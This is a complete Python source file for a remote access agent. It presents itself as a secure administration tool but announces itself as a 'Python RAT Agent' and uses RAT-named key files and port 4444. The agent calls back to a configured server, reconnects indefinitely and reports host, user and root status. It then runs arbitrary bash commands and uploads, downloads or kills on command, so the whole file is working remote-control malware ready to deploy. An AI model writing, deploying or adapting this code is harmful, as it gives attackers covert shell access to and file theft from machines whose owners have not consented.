#!/usr/bin/env python3
"""
Secure Remote Administration Agent — Linux/Python version

Configure the variables below, then deploy to Linux endpoints.
The PSK and CertThumbprint are printed by the server on startup.

Run with:
    python3 agent.py
    # Or as a service/background process
"""

import base64, hashlib, hmac, json, os, platform, pwd, socket, ssl, struct
import subprocess, sys, time
from pathlib import Path
from datetime import datetime

# ═══════════════════════════════════════════════════════════════
#  CONFIGURATION — edit these values
# ═══════════════════════════════════════════════════════════════

SERVER_HOST      = "127.0.0.1"
SERVER_PORT      = 4444
PSK              = "PASTE_PSK_HERE"  # from rat_psk.txt
CERT_FINGERPRINT = ""                # from rat_fingerprint.txt (optional)
USE_TLS          = True
RECONNECT_SECS   = 10
MAX_MSG_BYTES    = 50 * 1024 * 1024  # 50 MB cap


# ═══════════════════════════════════════════════════════════════
#  Protocol helpers
# ═══════════════════════════════════════════════════════════════

def send_msg(stream, data: dict):
    """Send length-prefixed JSON message."""
    payload = json.dumps(data).encode("utf-8")
    header  = struct.pack("<I", len(payload))
    stream.sendall(header + payload)


def recv_msg(stream) -> dict:
    """Receive length-prefixed JSON message."""
    def recv_exact(n: int) -> bytes:
        buf = b""
        while len(buf) < n:
            chunk = stream.recv(n - len(buf))
            if not chunk:
                raise ConnectionError("Connection closed")
            buf += chunk
        return buf
    
    hdr = recv_exact(4)
    length = struct.unpack("<I", hdr)[0]
    if length == 0 or length > MAX_MSG_BYTES:
        raise ValueError(f"Invalid message length: {length}")
    raw = recv_exact(length)
    return json.loads(raw.decode("utf-8"))


# ═══════════════════════════════════════════════════════════════
#  HMAC authentication
# ═══════════════════════════════════════════════════════════════

def authenticate(stream, psk: str):
    """Perform HMAC challenge/response authentication."""
    challenge = recv_msg(stream)
    if challenge.get("type") != "challenge":
        raise ValueError(f"Expected challenge, got {challenge.get('type')}")
    
    nonce_bytes = bytes.fromhex(challenge["nonce"])
    hmac_digest = hmac.new(psk.encode(), nonce_bytes, hashlib.sha256).digest()
    
    send_msg(stream, {"type": "auth", "hmac": hmac_digest.hex()})
    
    auth_resp = recv_msg(stream)
    if auth_resp.get("type") != "auth_ok":
        raise ValueError("Authentication failed — check PSK")


# ═══════════════════════════════════════════════════════════════
#  TLS with optional cert pinning
# ═══════════════════════════════════════════════════════════════

def get_secure_stream(sock):
    """Upgrade to TLS with optional certificate pinning."""
    if not USE_TLS:
        return sock
    
    context = ssl.create_default_context()
    
    if CERT_FINGERPRINT:
        # Cert pinning: verify exact SHA-256 fingerprint
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        tls_stream = context.wrap_socket(sock, server_hostname=SERVER_HOST)
        
        # Get server cert DER bytes and compute SHA-256
        der = tls_stream.getpeercert(binary_form=True)
        actual_fp = hashlib.sha256(der).hexdigest().upper()
        
        if actual_fp != CERT_FINGERPRINT.upper():
            tls_stream.close()
            raise ValueError(f"Cert fingerprint mismatch: {actual_fp} != {CERT_FINGERPRINT}")
        
        return tls_stream
    else:
        # Accept any cert (less secure, but still encrypted)
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        return context.wrap_socket(sock, server_hostname=SERVER_HOST)


# ═══════════════════════════════════════════════════════════════
#  System info helpers
# ═══════════════════════════════════════════════════════════════

def get_username():
    """Get current username."""
    try:
        return pwd.getpwuid(os.getuid()).pw_name
    except Exception:
        return os.environ.get("USER", "unknown")


def get_hostname():
    """Get system hostname."""
    return socket.gethostname()


def get_local_ip():
    """Best-guess local IP (non-loopback)."""
    try:
        # Connect to a public IP to determine routing interface
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "Unknown"


def is_root():
    """Check if running as root."""
    return os.geteuid() == 0


def get_uptime():
    """System uptime as human-readable string."""
    try:
        with open("/proc/uptime") as f:
            uptime_secs = float(f.read().split()[0])
        days = int(uptime_secs // 86400)
        hours = int((uptime_secs % 86400) // 3600)
        mins = int((uptime_secs % 3600) // 60)
        return f"{days}d {hours}h {mins}m"
    except Exception:
        return "N/A"


def get_ram_gb():
    """Total RAM in GB."""
    try:
        with open("/proc/meminfo") as f:
            for line in f:
                if line.startswith("MemTotal:"):
                    kb = int(line.split()[1])
                    return round(kb / (1024 ** 2), 2)
    except Exception:
        pass
    return "N/A"


# ═══════════════════════════════════════════════════════════════
#  Command handlers
# ═══════════════════════════════════════════════════════════════

def cmd_shell(args: str) -> tuple:
    """Execute shell command via bash."""
    try:
        result = subprocess.run(
            args,
            shell=True,
            executable="/bin/bash",
            capture_output=True,
            timeout=30,
            text=True,
        )
        output = result.stdout + result.stderr
        return ("ok", output)
    except subprocess.TimeoutExpired:
        return ("error", "Command timed out after 30 seconds")
    except Exception as e:
        return ("error", str(e))


def cmd_sysinfo() -> tuple:
    """Gather system information."""
    try:
        uname = platform.uname()
        info = {
            "hostname": get_hostname(),
            "username": get_username(),
            "os": f"{uname.system} {uname.release}",
            "arch": uname.machine,
            "ram_gb": get_ram_gb(),
            "uptime": get_uptime(),
            "cwd": os.getcwd(),
            "local_ip": get_local_ip(),
            "python_ver": platform.python_version(),
            "is_root": is_root(),
        }
        return ("ok", json.dumps(info))
    except Exception as e:
        return ("error", str(e))


def cmd_ls(path: str) -> tuple:
    """List directory contents."""
    try:
        if not path:
            path = "."
        p = Path(path)
        items = []
        for entry in sorted(p.iterdir(), key=lambda x: x.name.lower()):
            stat = entry.stat()
            items.append({
                "Name": entry.name,
                "Type": "dir" if entry.is_dir() else "file",
                "Length": stat.st_size if entry.is_file() else 0,
                "LastWriteTime": datetime.fromtimestamp(stat.st_mtime).isoformat(),
            })
        return ("ok", json.dumps(items))
    except Exception as e:
        return ("error", str(e))


def cmd_cd(path: str) -> tuple:
    """Change working directory."""
    try:
        os.chdir(path)
        return ("ok", os.getcwd())
    except Exception as e:
        return ("error", str(e))


def cmd_ps() -> tuple:
    """List running processes."""
    try:
        result = subprocess.run(
            ["ps", "aux", "--no-headers"],
            capture_output=True,
            text=True,
            timeout=10,
        )
        procs = []
        for line in result.stdout.strip().split("\n"):
            parts = line.split(None, 10)
            if len(parts) >= 11:
                procs.append({
                    "Id": parts[1],
                    "ProcessName": parts[10][:50],  # truncate long names
                    "CPU": float(parts[2]),
                    "RAM": float(parts[3]),  # %MEM
                })
        return ("ok", json.dumps(procs))
    except Exception as e:
        return ("error", str(e))


def cmd_kill(pid: str) -> tuple:
    """Kill process by PID."""
    try:
        subprocess.run(["kill", "-9", pid], check=True, timeout=5)
        return ("ok", f"Process {pid} terminated.")
    except subprocess.CalledProcessError:
        return ("error", f"Failed to kill process {pid}")
    except Exception as e:
        return ("error", str(e))


def cmd_download(path: str) -> tuple:
    """Read file and return as base64."""
    try:
        with open(path, "rb") as f:
            data = f.read()
        b64 = base64.b64encode(data).decode()
        return ("ok", b64)
    except Exception as e:
        return ("error", str(e))


def cmd_upload(path: str, data: str) -> tuple:
    """Write base64 data to file."""
    try:
        content = base64.b64decode(data)
        with open(path, "wb") as f:
            f.write(content)
        return ("ok", f"Uploaded {len(content)} bytes to {path}")
    except Exception as e:
        return ("error", str(e))


# ═══════════════════════════════════════════════════════════════
#  Main loop
# ═══════════════════════════════════════════════════════════════

def main():
    print(f"[*] Python RAT Agent starting...")
    print(f"[*] Target: {SERVER_HOST}:{SERVER_PORT}")
    print(f"[*] TLS: {'enabled' if USE_TLS else 'DISABLED'}")
    if CERT_FINGERPRINT:
        print(f"[*] Cert pinning: {CERT_FINGERPRINT[:16]}...")
    
    while True:
        sock = None
        stream = None
        try:
            # Connect
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(15)
            sock.connect((SERVER_HOST, SERVER_PORT))
            
            # TLS upgrade
            stream = get_secure_stream(sock)
            stream.settimeout(15)
            
            # HMAC auth
            authenticate(stream, PSK)
            
            # Remove timeout for normal ops
            stream.settimeout(None)
            
            # Registration
            uname = platform.uname()
            reg = {
                "type": "register",
                "hostname": get_hostname(),
                "username": get_username(),
                "os": f"{uname.system} {uname.release}",
                "arch": uname.machine,
                "ip": get_local_ip(),
                "python_ver": platform.python_version(),
                "is_root": is_root(),
            }
            send_msg(stream, reg)
            print(f"[+] Connected and authenticated")
            
            # Command loop
            while True:
                msg = recv_msg(stream)
                cmd = msg.get("command")
                resp = {"type": "response", "id": msg["id"], "status": "ok", "output": ""}
                
                if cmd == "shell":
                    status, output = cmd_shell(msg.get("args", ""))
                    resp["status"], resp["output"] = status, output
                
                elif cmd == "sysinfo":
                    status, output = cmd_sysinfo()
                    resp["status"], resp["output"] = status, output
                
                elif cmd == "ls":
                    status, output = cmd_ls(msg.get("args", ""))
                    resp["status"], resp["output"] = status, output
                
                elif cmd == "cd":
                    status, output = cmd_cd(msg.get("args", ""))
                    resp["status"], resp["output"] = status, output
                
                elif cmd == "ps":
                    status, output = cmd_ps()
                    resp["status"], resp["output"] = status, output
                
                elif cmd == "kill":
                    status, output = cmd_kill(msg.get("args", ""))
                    resp["status"], resp["output"] = status, output
                
                elif cmd == "download":
                    status, output = cmd_download(msg.get("args", ""))
                    resp["status"], resp["output"] = status, output
                
                elif cmd == "upload":
                    status, output = cmd_upload(msg.get("path", ""), msg.get("data", ""))
                    resp["status"], resp["output"] = status, output
                
                elif cmd == "ping":
                    resp["output"] = "pong"
                
                else:
                    resp["status"] = "error"
                    resp["output"] = f"Unknown command: {cmd}"
                
                send_msg(stream, resp)
        
        except KeyboardInterrupt:
            print("\n[!] Interrupted by user")
            break
        except Exception as e:
            print(f"[!] Connection error: {e}")
        finally:
            if stream:
                try:
                    stream.close()
                except Exception:
                    pass
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass
        
        print(f"[*] Reconnecting in {RECONNECT_SECS} seconds...")
        time.sleep(RECONNECT_SECS)


if __name__ == "__main__":
    main()
